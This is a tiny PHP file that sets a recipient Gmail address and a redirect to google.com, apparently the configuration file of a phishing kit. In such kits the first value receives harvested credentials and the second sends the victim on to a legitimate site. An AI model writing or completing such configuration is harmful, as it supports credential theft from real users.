<?php 
$Receive_email="rsltbxs6@gmail.com";
$redirect="https://www.google.com/";
?>